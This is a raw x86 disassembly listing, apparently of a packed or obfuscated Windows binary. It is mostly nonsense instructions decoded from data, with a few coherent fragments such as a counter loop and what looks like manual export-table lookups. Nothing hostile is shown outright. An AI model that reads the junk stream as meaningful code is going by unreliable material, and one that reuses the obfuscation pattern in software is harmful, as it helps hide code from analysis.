  40ad58:	sbb    ch,BYTE PTR [ebx-0x29]
  40ad5b:	xchg   edx,eax
  40ad5c:	jmp    0x3e6a:0x67d31600
  40ad63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad64:	ffree  st(3)
  40ad66:	fdivrp st(7),st
  40ad68:	adc    bh,ch
  40ad6a:	ret    
  40ad6b:	sbb    eax,0xd8feb1d9
  40ad70:	adc    al,0x71
  40ad72:	jg     0x40ad4c
  40ad74:	pop    ebp
  40ad75:	adc    DWORD PTR [esi-0x7d58968e],ecx
  40ad7b:	rcl    DWORD PTR [ebp+0x716398ea],1
  40ad81:	sbb    ch,BYTE PTR [edx]
  40ad83:	sbb    BYTE PTR [ebx-0x30],bh
  40ad86:	popf   
  40ad87:	xchg   ebp,eax
  40ad88:	(bad)  
  40ad89:	jge    0x40adb2
  40ad8b:	jmp    0x6ea570ab
  40ad90:	popa   
  40ad91:	push   cs
  40ad92:	fs fs into 
  40ad95:	cli    
  40ad96:	add    eax,0x39def9af
  40ad9b:	xor    al,0xeb
  40ad9d:	lea    ebp,[edx-0x22087b80]
  40ada3:	pusha  
  40ada4:	pop    ss
  40ada5:	outs   dx,DWORD PTR ds:[esi]
  40ada6:	mov    bh,0x96
  40ada8:	sbb    ecx,DWORD PTR [esi]
  40adaa:	push   ecx
  40adab:	fs call 0xa3380210
  40adb1:	int    0xae
  40adb3:	aad    0x2a
  40adb5:	xchg   edi,eax
  40adb6:	outs   dx,BYTE PTR ds:[esi]
  40adb7:	cmp    eax,0xd19fdc8e
  40adbc:	ror    esi,0xee
  40adbf:	mov    ebp,DWORD PTR [edx-0x7a65a2f3]
  40adc5:	mov    esp,DWORD PTR [eax]
  40adc7:	scas   eax,DWORD PTR es:[edi]
  40adc8:	sbb    al,0x9
  40adca:	outs   dx,BYTE PTR ds:[esi]
  40adcb:	jge    0x40adb3
  40adcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adce:	dec    ebp
  40adcf:	cwde   
  40add0:	mov    BYTE PTR [ebp-0x19],ah
  40add3:	ror    DWORD PTR [ebx-0x706acc93],cl
  40add9:	xchg   ebp,eax
  40adda:	shl    DWORD PTR [eax-0xb],cl
  40addd:	int3   
  40adde:	ret    
  40addf:	std    
  40ade0:	inc    esi
  40ade1:	mov    ecx,0x2a706a76
  40ade6:	adc    DWORD PTR gs:[ecx],esi
  40ade9:	cmp    BYTE PTR [edx],0xfa
  40adec:	dec    edi
  40aded:	sbb    al,0x3c
  40adef:	xor    bh,ah
  40adf1:	js     0x40ad98
  40adf3:	add    BYTE PTR [esi+0x77fd04b6],cl
  40adf9:	outs   dx,DWORD PTR ds:[esi]
  40adfa:	and    ecx,DWORD PTR [esi+edx*2+0x0]
  40adfe:	or     edi,edx
  40ae00:	nop
  40ae01:	fwait
  40ae02:	aam    0x21
  40ae04:	div    DWORD PTR [edx]
  40ae06:	es sbb al,0x2b
  40ae09:	sbb    DWORD PTR [edi],ebx
  40ae0b:	or     ebp,ebp
  40ae0d:	popf   
  40ae0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae0f:	enter  0xfb8e,0xb8
  40ae13:	ja     0x40ae68
  40ae15:	in     eax,dx
  40ae16:	dec    esp
  40ae17:	xchg   esi,eax
  40ae18:	in     eax,0x8a
  40ae1a:	retf   0x535f
  40ae1d:	mov    ds:0xd5eec2d7,eax
  40ae22:	mov    esp,0x7e77e3da
  40ae27:	sar    BYTE PTR [ebx+0x35d2bc52],cl
  40ae2d:	(bad)  
  40ae2e:	sbb    eax,0x40050967
  40ae33:	shr    BYTE PTR [edi-0x6d],1
  40ae36:	fild   DWORD PTR [edi+0x56]
  40ae39:	xor    eax,0x80621337
  40ae3e:	retf   
  40ae3f:	mov    bh,0x9d
  40ae41:	mov    ebx,eax
  40ae43:	pushf  
  40ae44:	adc    DWORD PTR [ebp-0x29730c1],esp
  40ae4a:	stos   BYTE PTR es:[edi],al
  40ae4b:	dec    ebp
  40ae4c:	outs   dx,DWORD PTR ds:[esi]
  40ae4d:	into   
  40ae4e:	and    al,0xd0
  40ae50:	xchg   esi,eax
  40ae51:	xchg   BYTE PTR [eax+0x68],al
  40ae54:	push   edx
  40ae55:	push   edx
  40ae56:	shl    BYTE PTR [eax],0x56
  40ae59:	in     al,0x6
  40ae5b:	adc    DWORD PTR [esi-0x4e3b0289],ebp
  40ae61:	xchg   ecx,eax
  40ae62:	js     0x40ae9b
  40ae64:	pop    es
  40ae65:	sub    al,0x52
  40ae67:	inc    esi
  40ae68:	sbb    al,0x18
  40ae6a:	cld    
  40ae6b:	repz mov ds:0x6009d8c2,eax
  40ae71:	adc    cl,al
  40ae73:	js     0x40ae9b
  40ae75:	and    edx,DWORD PTR [ecx]
  40ae77:	jmp    FWORD PTR ds:0xd35538fc
  40ae7d:	mov    ebx,0x3db59ca2
  40ae82:	in     eax,dx
  40ae83:	shr    bh,cl
  40ae85:	push   0xd3fbae46
  40ae8a:	or     al,0x58
  40ae8c:	mov    ebp,0x9d417424
  40ae91:	and    dl,bh
  40ae93:	lods   al,BYTE PTR ds:[esi]
  40ae94:	sub    DWORD PTR [edx-0x2a6ba605],esi
  40ae9a:	mov    esi,0x2d13f7d2
  40ae9f:	test   eax,0xd862dad0
  40aea4:	sub    DWORD PTR [edi+0x4e112c18],esi
  40aeaa:	pushf  
  40aeab:	mov    ds,WORD PTR [edi+0x7411f60e]
  40aeb1:	ficomp DWORD PTR [ebx*1-0x2267d26d]
  40aeb8:	scas   eax,DWORD PTR es:[edi]
  40aeb9:	fs sahf 
  40aebb:	mov    ds:0x217c3415,eax
  40aec0:	push   ebx
  40aec1:	pop    es
  40aec2:	cli    
  40aec3:	mov    WORD PTR [ebx],gs
  40aec5:	jnp    0x40ae5a
  40aec7:	mov    cl,0x4a
  40aec9:	in     eax,0x9d
  40aecb:	aam    0x9f
  40aecd:	push   ebx
  40aece:	ret    0x18a6
  40aed1:	pusha  
  40aed2:	stos   BYTE PTR es:[edi],al
  40aed3:	out    0x28,al
  40aed5:	fidivr DWORD PTR [edx-0xf]
  40aed8:	nop
  40aed9:	inc    eax
  40aeda:	cli    
  40aedb:	out    0x5b,eax
  40aedd:	jne    0x40af56
  40aedf:	push   edx
  40aee0:	or     DWORD PTR [edx-0x2e01d965],edi
  40aee6:	and    DWORD PTR [edi],0x615ad661
  40aeec:	mov    ecx,0x34c072c1
  40aef1:	sahf   
  40aef2:	mov    bh,bl
  40aef4:	add    DWORD PTR [eax+0x5beb0a82],ebx
  40aefa:	push   cs
  40aefb:	sbb    al,0xfc
  40aefd:	push   ecx
  40aefe:	pop    esi
  40aeff:	or     BYTE PTR [esi+0x4402507b],ah
  40af05:	xor    DWORD PTR [ebx-0x6b],ecx
  40af08:	lahf   
  40af09:	pop    ss
  40af0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af0b:	dec    ebx
  40af0c:	shl    BYTE PTR [ebx],1
  40af0e:	sar    BYTE PTR [eax+0x73935134],1
  40af14:	jmp    0x2e28bbc0
  40af19:	ror    BYTE PTR [esi-0x474b96ee],cl
  40af1f:	jo     0x40af23
  40af21:	jnp    0x40aeb1
  40af23:	loope  0x40af9b
  40af25:	icebp  
  40af26:	shl    BYTE PTR [esp+eax*4],cl
  40af29:	aaa    
  40af2a:	mov    eax,ds:0x3d9de22a
  40af2f:	mov    eax,0x25d8171d
  40af34:	mov    dh,0x3f
  40af36:	shl    BYTE PTR [edx],1
  40af38:	lea    ebp,[ecx+0x15b1ed2a]
  40af3e:	pop    es
  40af3f:	(bad)
  40af42:	out    0x9,eax
  40af44:	push   ebp
  40af45:	mov    edx,0xedafce58
  40af4a:	or     ch,dl
  40af4c:	mov    esi,ss
  40af4e:	pop    es
  40af4f:	jo     0x40af15
  40af51:	neg    DWORD PTR [edi-0x78552db4]
  40af57:	sar    DWORD PTR [edi-0x7a],cl
  40af5a:	cmp    bl,ch
  40af5c:	mov    DWORD PTR [edi-0xf76a10b],eax
  40af62:	dec    esi
  40af63:	cmp    BYTE PTR [esi+0x5e],ch
  40af66:	cmp    al,BYTE PTR [ebp+0x3cd4ec11]
  40af6c:	aas    
  40af6d:	leave  
  40af6e:	jg     0x40af21
  40af70:	sub    al,0x8b
  40af72:	inc    eax
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	mov    ch,0xa7
  40b019:	cs inc eax
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	add    cl,BYTE PTR [edi-0x20]
  40b026:	les    ebp,FWORD PTR [edx]
  40b028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b029:	cli    
  40b02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b02b:	and    edi,DWORD PTR [esi-0x3411c1ab]
  40b031:	mov    DWORD PTR [ebx-0x3],edx
  40b034:	jb     0x40b03a
  40b036:	push   ds
  40b037:	rcr    edi,0xbb
  40b03a:	js     0x40b09c
  40b03c:	mov    cl,0x8e
  40b03e:	imul   ecx,DWORD PTR [edx-0x25],0xffffffe9
  40b042:	xor    eax,0x48f2d8e
  40b047:	ds div dl
  40b04a:	std    
  40b04b:	dec    edx
  40b04c:	aad    0xd9
  40b04e:	outs   dx,BYTE PTR ds:[esi]
  40b04f:	sub    DWORD PTR [ebx+0xc1cb4e4],ebx
  40b055:	xchg   edx,eax
  40b056:	and    eax,0x48e63404
  40b05b:	idiv   esp
  40b05d:	mov    eax,0x2d45c9c8
  40b062:	fist   WORD PTR [edi-0x5f195ec1]
  40b068:	popa   
  40b069:	pop    esi
  40b06a:	arpl   cx,bp
  40b06c:	repnz scas al,BYTE PTR es:[edi]
  40b06e:	jo     0x40b020
  40b070:	pop    edi
  40b071:	xchg   edx,eax
  40b072:	popa   
  40b073:	pop    esp
  40b074:	fisub  WORD PTR [ecx+edx*4-0x1f]
  40b078:	(bad)  
  40b079:	jnp    0x40b060
  40b07b:	adc    DWORD PTR [edx+0x517783e5],ebp
  40b081:	and    al,0x30
  40b083:	push   esi
  40b084:	cmp    BYTE PTR [ebx-0x279173ed],al
  40b08a:	fcomp  DWORD PTR [ecx]
  40b08c:	mov    al,ds:0x7e8aac6e
  40b091:	mov    al,0x80
  40b093:	adc    DWORD PTR [eax],0x15ba10cc
  40b099:	mov    bh,0x88
  40b09b:	xor    ch,BYTE PTR [esi+0x24a26575]
  40b0a1:	cld    
  40b0a2:	sub    al,BYTE PTR [esi+0x4c]
  40b0a5:	push   eax
  40b0a6:	mov    eax,ds:0x9d210b1b
  40b0ab:	js     0x40b0a8
  40b0ad:	mov    bl,0x3b
  40b0af:	out    dx,al
  40b0b0:	je     0x40b0b1
  40b0b2:	cmp    DWORD PTR [ecx+0x25ce42c4],edi
  40b0b8:	jmp    0xc004:0xb1ab070b
  40b0bf:	sub    esp,DWORD PTR [esi]
  40b0c1:	push   ebp
  40b0c2:	sub    al,BYTE PTR [ecx-0x6553586a]
  40b0c8:	ins    DWORD PTR es:[edi],dx
  40b0c9:	jno    0x40b061
  40b0cb:	in     al,dx
  40b0cc:	sub    al,0xee
  40b0ce:	(bad)  
  40b0cf:	in     al,dx
  40b0d0:	mov    ebx,0xbddeba4e
  40b0d5:	dec    esi
  40b0d6:	(bad)
  40b0d9:	repz mov bl,BYTE PTR [edx+0x27]
  40b0dd:	pusha  
  40b0de:	sbb    eax,0x15fadb6e
  40b0e3:	or     al,0x2f
  40b0e5:	neg    DWORD PTR [edi+0x35766cc7]
  40b0eb:	outs   dx,DWORD PTR ds:[esi]
  40b0ec:	mul    DWORD PTR [esi+0x47]
  40b0ef:	imul   edx,DWORD PTR [ecx+eiz*8+0x7d89b56],0xb5c8b56b
  40b0fa:	push   ecx
  40b0fb:	ret    0x9ee6
  40b0fe:	iret   
  40b0ff:	fs mov ecx,0xa36ee75c
  40b105:	retf   0xa24e
  40b108:	div    bl
  40b10a:	fmul   DWORD PTR [edi-0x8]
  40b10d:	push   cs
  40b10e:	mov    ds:0x89098c4a,al
  40b113:	pop    edi
  40b114:	or     eax,0x157f907a
  40b119:	cmp    BYTE PTR [ebx],bh
  40b11b:	shr    edx,cl
  40b11d:	push   edi
  40b11e:	daa    
  40b11f:	mov    ebp,DWORD PTR ds:0xc6833521
  40b125:	mov    eax,ecx
  40b127:	mov    ah,BYTE PTR [ebx-0x18]
  40b12a:	repz xor WORD PTR [ecx],cx
  40b12e:	mov    eax,0x6b6456d9
  40b133:	inc    ebp
  40b134:	or     esi,ebx
  40b136:	mov    ecx,0x117185bd
  40b13b:	in     al,0x33
  40b13d:	clc    
  40b13e:	ins    DWORD PTR es:[edi],dx
  40b13f:	sbb    cl,cl
  40b141:	mov    esp,0x497b7472
  40b146:	mov    ds:0x879d5a75,al
  40b14b:	xchg   ecx,eax
  40b14c:	inc    eax
  40b14d:	push   ebp
  40b14e:	stos   BYTE PTR es:[edi],al
  40b14f:	ret    0x1d65
  40b152:	add    BYTE PTR [ebp-0x75],dl
  40b155:	and    esi,DWORD PTR [ebp-0x6e]
  40b158:	mov    dh,0x88
  40b15a:	xor    eax,0x226acd76
  40b15f:	push   ss
  40b160:	ja     0x40b1af
  40b162:	push   ss
  40b163:	bound  edi,QWORD PTR [esi]
  40b165:	mov    ds:0x79e5690d,al
  40b16a:	sub    eax,esi
  40b16c:	fbstp  TBYTE PTR fs:[esi]
  40b16f:	test   BYTE PTR [ecx],bl
  40b171:	xchg   ecx,eax
  40b172:	repz test al,0xb8
  40b175:	sub    BYTE PTR [edx],dh
  40b177:	rol    DWORD PTR [ecx+esi*4-0x5596ab6c],cl
  40b17e:	cmp    eax,0x14889c50
  40b183:	cmp    eax,0x17c23288
  40b188:	jle    0x40b12d
  40b18a:	xlat   BYTE PTR es:[ebx]
  40b18c:	enter  0xbfa3,0x4e
  40b190:	sahf   
  40b191:	pop    ss
  40b192:	mov    dl,0x10
  40b194:	scas   al,BYTE PTR es:[edi]
  40b195:	pop    ecx
  40b196:	adc    DWORD PTR [edi-0x3393be02],edi
  40b19c:	sbb    eax,0x32358f78
  40b1a1:	pop    edx
  40b1a2:	sub    ebp,DWORD PTR [ebp-0x745e1f7]
  40b1a8:	dec    ebp
  40b1a9:	jno    0x40b186
  40b1ab:	inc    ecx
  40b1ac:	and    cl,al
  40b1ae:	and    al,0x37
  40b1b0:	loopne 0x40b15e
  40b1b2:	cmp    DWORD PTR [edx],ebp
  40b1b4:	scas   al,BYTE PTR es:[edi]
  40b1b5:	in     eax,0xa2
  40b1b7:	mov    esp,0xf6e53b83
  40b1bc:	inc    esi
  40b1bd:	xchg   edi,eax
  40b1be:	sub    eax,DWORD PTR [eax+eax*8+0x50a5a6c7]
  40b1c5:	rcr    esi,0x2a
  40b1c8:	fisub  WORD PTR [eax+ebx*2]
  40b1cb:	(bad)  
  40b1cc:	std    
  40b1cd:	push   ss
  40b1ce:	push   ecx
  40b1cf:	mov    dh,bl
  40b1d1:	jbe    0x40b1f0
  40b1d3:	cmp    esp,DWORD PTR [eax]
  40b1d5:	sub    DWORD PTR [ebp+0x7927caef],ebx
  40b1db:	cwde   
  40b1dc:	ds call 0x69613096
  40b1e2:	inc    ecx
  40b1e3:	repz adc edx,DWORD PTR [ebx+0x29]
  40b1e7:	sub    eax,DWORD PTR [esi+edi*2+0x62]
  40b1eb:	and    eax,0xcf056c8e
  40b1f0:	lods   al,BYTE PTR ds:[esi]
  40b1f1:	and    eax,0xc0419a54
  40b1f6:	push   esp
  40b1f7:	pop    edx
  40b1f8:	mov    ah,0x92
  40b1fa:	sub    esi,ebp
  40b1fc:	add    eax,0x1f9a035b
  40b201:	repz je 0x40b1dd
  40b204:	and    al,0x11
  40b206:	cmp    eax,0x4a0ab559
  40b20b:	mov    esp,0xf64c877e
  40b210:	sbb    BYTE PTR [ecx],dl
  40b212:	sub    BYTE PTR [edx],bh
  40b214:	dec    esp
  40b215:	popa   
  40b216:	ret    
  40b217:	out    0xf1,eax
  40b219:	sub    ah,BYTE PTR [ecx-0x426e3c39]
  40b21f:	mov    ds:0x40ea965d,eax
  40b224:	sti    
  40b225:	mov    esp,0xbdaae8f2
  40b22a:	push   es
  40b22b:	clc    
  40b22c:	mov    ch,0x3b
  40b22e:	mov    DWORD PTR [eax+ebp*4+0x7761ec2e],esp
  40b235:	fdiv   DWORD PTR [ebx-0x5c5a8b6c]
  40b23b:	jge    0x40b21c
  40b23d:	lods   al,BYTE PTR ds:[esi]
  40b23e:	xchg   ebp,eax
  40b23f:	sub    dl,bh
  40b241:	mov    al,ds:0x6929c092
  40b246:	mov    al,ds:0xb24b1ea6
  40b24b:	(bad)  
  40b24c:	xor    BYTE PTR [ebx+0x5cbf2ef],bl
  40b252:	pop    ss
  40b253:	or     al,0x80
  40b255:	xor    DWORD PTR [ebx-0x3eea6cf],esp
  40b25b:	ja     0x40b231
  40b25d:	jno    0x40b279
  40b25f:	std    
  40b260:	icebp  
  40b261:	inc    edx
  40b262:	sbb    DWORD PTR [ebx+0x74669f08],0xec458bc6
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	mov    eax,0x2e9aa712
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	pop    ebp
  40b290:	daa    
  40b291:	mov    ebp,0xd99df193
  40b296:	mov    cl,0x3c
  40b298:	mov    ?,WORD PTR [eax+0x1da3b544]
  40b29e:	into   
  40b29f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2a0:	cmp    ebx,DWORD PTR [esi-0x29]
  40b2a3:	popa   
  40b2a4:	cs es dec eax
  40b2a7:	xor    esp,DWORD PTR [edx-0x7e5dd28c]
  40b2ad:	or     DWORD PTR [ecx+edx*1-0x80],ebx
  40b2b1:	pop    edi
  40b2b2:	cmp    DWORD PTR [ebx-0x78aebe0c],esp
  40b2b8:	cmp    BYTE PTR [edx],dl
  40b2ba:	std    
  40b2bb:	sbb    al,dl
  40b2bd:	jb     0x40b289
  40b2bf:	fcmovnbe st,st(2)
  40b2c1:	dec    esp
  40b2c2:	fisubr DWORD PTR [edx+eiz*4]
  40b2c5:	sti    
  40b2c6:	cdq    
  40b2c7:	pop    edi
  40b2c8:	mov    cl,BYTE PTR [esi-0x894017c]
  40b2ce:	jg     0x40b2aa
  40b2d0:	sbb    al,0x69
  40b2d2:	cmp    BYTE PTR [ebx],bl
  40b2d4:	cmp    ebp,DWORD PTR [edx]
  40b2d6:	dec    ebp
  40b2d7:	pop    edx
  40b2d8:	test   BYTE PTR [ecx-0x5e73971a],ah
  40b2de:	lods   al,BYTE PTR ds:[esi]
  40b2df:	mov    dh,0xe2
  40b2e1:	xchg   edi,eax
  40b2e2:	jne    0x40b2a3
  40b2e4:	rol    DWORD PTR [edx-0x54],cl
  40b2e7:	and    DWORD PTR [ebx+eax*1+0x39],esp
  40b2eb:	ret    0x96a4
  40b2ee:	xor    DWORD PTR [ebx-0x7e],0xa1f1ae00
  40b2f5:	xor    eax,0xa883bdc4
  40b2fa:	xchg   edi,eax
  40b2fc:	or     edi,DWORD PTR [eax-0x47042085]
  40b302:	fnstsw WORD PTR [edx-0x53]
  40b305:	(bad)  
  40b306:	pop    esi
  40b307:	jle    0x40b305
  40b309:	push   ss
  40b30a:	aaa    
  40b30b:	aad    0x53
  40b30d:	push   ss
  40b30e:	popf   
  40b30f:	cmp    al,0xc8
  40b311:	ss ds pushf 
  40b314:	mov    ds:0x490d9667,eax
  40b319:	out    dx,eax
  40b31a:	dec    esp
  40b31b:	aaa    
  40b31c:	lock inc edi
  40b31e:	sbb    al,0xb2
  40b320:	xchg   esi,eax
  40b321:	cmp    al,0xc3
  40b323:	imul   ebx,DWORD PTR [ebx],0xffffffdc
  40b326:	ds (bad) 
  40b328:	aam    0xe2
  40b32a:	ins    DWORD PTR es:[edi],dx
  40b32b:	daa    
  40b32c:	(bad)  
  40b32e:	xor    esp,edi
  40b330:	sar    cl,cl
  40b332:	mov    esp,0x7a5e89d5
  40b337:	inc    ebx
  40b338:	pop    ecx
  40b339:	nop
  40b33a:	lds    ebx,FWORD PTR gs:[ebp+0x3c]
  40b33e:	loopne 0x40b373
  40b340:	fs aaa 
  40b342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b343:	push   eax
  40b344:	mov    ecx,ss
  40b346:	stc    
  40b347:	repnz or al,0x5c
  40b34a:	pop    ecx
  40b34b:	mov    ebx,0x80a32ee6
  40b350:	sahf   
  40b351:	aad    0x9a
  40b353:	nop
  40b354:	cmp    ch,BYTE PTR [edx+esi*8+0x5c55de6e]
  40b35b:	aad    0xc4
  40b35d:	pop    ecx
  40b35e:	and    eax,0x389d6a52
  40b363:	sub    DWORD PTR [edx+0x0],edi
  40b366:	xchg   BYTE PTR [ebp+0x44d0ce60],ah
  40b36c:	fild   QWORD PTR [edx+0x49763ba5]
  40b372:	in     al,0x26
  40b374:	ror    DWORD PTR [ebx+0x720e0704],0xd0
  40b37b:	call   0xa54e:0xf5be7ab7
  40b382:	outs   dx,DWORD PTR ds:[esi]
  40b383:	cmp    eax,0x4af52e47
  40b388:	imul   esi,DWORD PTR [edi+0x5a7acd3a],0x91b37bb1
  40b392:	push   esp
  40b393:	arpl   WORD PTR [ecx-0x46],dx
  40b396:	push   ebx
  40b397:	mov    sp,ax
  40b39a:	add    al,0x74
  40b39c:	xor    dh,BYTE PTR [esi]
  40b39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b39f:	jae    0x40b40e
  40b3a1:	out    0x20,eax
  40b3a3:	(bad)  
  40b3a4:	sub    DWORD PTR [eax],ebx
  40b3a6:	shr    DWORD PTR [edi-0xa],cl
  40b3a9:	mov    cl,0x8e
  40b3ab:	mov    ebx,0x2c2825f
  40b3b0:	sets   BYTE PTR [edi*4-0xbdd6a64]
  40b3b8:	jle    0x40b3db
  40b3ba:	cmc    
  40b3bb:	fadd   st(5),st
  40b3bd:	mov    bl,0x2d
  40b3bf:	pop    edi
  40b3c0:	or     cl,bh
  40b3c2:	mov    ds:0x73c85146,eax
  40b3c7:	inc    ebp
  40b3c8:	je     0x40b43e
  40b3ca:	add    BYTE PTR [edi+0x50],al
  40b3cd:	mov    dh,0x0
  40b3cf:	scas   eax,DWORD PTR es:[edi]
  40b3d0:	xor    DWORD PTR [ebx+0x7520a729],ebp
  40b3d6:	mov    WORD PTR [esi+ebx*8-0xaecdae9],fs
  40b3dd:	mov    WORD PTR [ecx],ds
  40b3df:	sbb    al,0xcf
  40b3e1:	mov    ah,0x28
  40b3e3:	dec    esp
  40b3e4:	dec    ebx
  40b3e5:	pushf  
  40b3e6:	jb     0x40b445
  40b3e8:	adc    BYTE PTR [edx+0x134d5bce],0xb3
  40b3ef:	add    esi,DWORD PTR [esi+edx*1]
  40b3f2:	mov    cl,0xb8
  40b3f4:	cdq    
  40b3f5:	nop
  40b3f6:	push   cs
  40b3f7:	mov    DWORD PTR [ebx],0x25e9bb60
  40b3fd:	jns    0x40b3b7
  40b3ff:	fwait
  40b400:	sbb    al,0x42
  40b402:	cdq    
  40b403:	xchg   ebx,eax
  40b404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b405:	or     al,0x91
  40b407:	fild   QWORD PTR ds:0xcb8a2ff6
  40b40d:	imul   edx,ecx,0x299f80e9
  40b413:	cli    
  40b414:	fistp  WORD PTR [ebp+0x24]
  40b417:	jo     0x40b3df
  40b419:	push   ebp
  40b41a:	push   esp
  40b41b:	test   al,0xa2
  40b41d:	ja     0x40b3ff
  40b41f:	scas   al,BYTE PTR es:[edi]
  40b420:	mov    ds:0x5096c493,al
  40b425:	cwde   
  40b426:	xlat   BYTE PTR ds:[ebx]
  40b427:	les    ecx,FWORD PTR [ecx+esi*1+0x58eed2f1]
  40b42e:	inc    esp
  40b42f:	sti    
  40b430:	aam    0xe
  40b432:	jbe    0x40b482
  40b434:	enter  0x6742,0xe2
  40b438:	xchg   ecx,eax
  40b439:	hlt    
  40b43a:	(bad)  
  40b43b:	jmp    0x8180:0xaebac3c3
  40b442:	or     dh,BYTE PTR [ecx]
  40b444:	pop    edi
  40b445:	cld    
  40b446:	push   0xffffffa3
  40b448:	fistp  QWORD PTR [edi+0x70f8c37f]
  40b44e:	out    0x9f,al
  40b450:	rol    cl,1
  40b452:	xlat   BYTE PTR ds:[ebx]
  40b453:	inc    ecx
  40b454:	and    DWORD PTR [ebp-0x4fc9a77e],ecx
  40b45a:	and    ebx,esi
  40b45c:	inc    esi
  40b45d:	dec    eax
  40b45e:	push   esi
  40b45f:	cmp    al,BYTE PTR [ebp-0x9]
  40b462:	xor    al,0xeb
  40b464:	inc    edx
  40b465:	push   cs
  40b466:	mov    dh,0xea
  40b468:	xchg   ebx,eax
  40b469:	out    dx,al
  40b46a:	ret    
  40b46b:	sub    eax,0xfb3159ad
  40b470:	ja     0x40b4dd
  40b472:	mov    ch,0xec
  40b474:	mov    al,0xc2
  40b476:	invd   
  40b478:	push   0x57
  40b47a:	daa    
  40b47b:	pusha  
  40b47c:	pop    ds
  40b47d:	mov    ch,0x3b
  40b47f:	test   DWORD PTR ds:0xf07395d,ebp
  40b485:	ss jno 0x40b455
  40b488:	repz add cl,BYTE PTR [esi]
  40b48b:	or     eax,0x3ead072b
  40b490:	sbb    al,0x71
  40b492:	add    ebp,ebx
  40b494:	rcl    DWORD PTR [ebx+0x76],1
  40b497:	jb     0x40b4cd
  40b499:	cld    
  40b49a:	cmp    edx,ebp
  40b49c:	add    BYTE PTR [eax-0x1ae53d69],0x27
  40b4a3:	xor    ebp,ebx
  40b4a5:	fdiv   QWORD PTR [edx-0xda85dd5]
  40b4ac:	push   ds
  40b4ad:	inc    eax
  40b4ae:	fidiv  DWORD PTR [esi]
  40b4b0:	sbb    al,BYTE PTR [edx+0xf2f1490]
  40b4b6:	push   edi
  40b4b7:	xchg   edi,eax
  40b4b8:	sbb    ah,BYTE PTR [eax+0x6c]
  40b4bb:	mov    ?,edi
  40b4bd:	mov    ah,BYTE PTR [esi]
  40b4bf:	je     0x40b4f8
  40b4c1:	inc    esp
  40b4c2:	pushf  
  40b4c3:	fnstcw WORD PTR [esi+ebx*2+0x35]
  40b4c7:	mov    ebp,0x610f7a8f
  40b4cc:	push   0x513750e8
  40b4d1:	sub    BYTE PTR [edx],dl
  40b4d3:	add    ah,ah
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	jo     0x40b54b
  40b509:	jne    0x40b4ff
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b4a8
  40b514:	sar    eax,0x13
  40b517:	mov    bh,0xac
  40b519:	std    
  40b51a:	aaa    
  40b51b:	jae    0x40b561
  40b51d:	ret    0xf338
  40b520:	(bad)  ds:0x49376c2a
  40b526:	jle    0x40b53c
  40b528:	loope  0x40b552
  40b52a:	out    0xd7,al
  40b52c:	fstp   DWORD PTR [esi+0x4f70fb74]
  40b532:	out    0x45,al
  40b534:	mov    eax,ds
  40b536:	cmp    ecx,DWORD PTR ds:0x5f1b2ad3
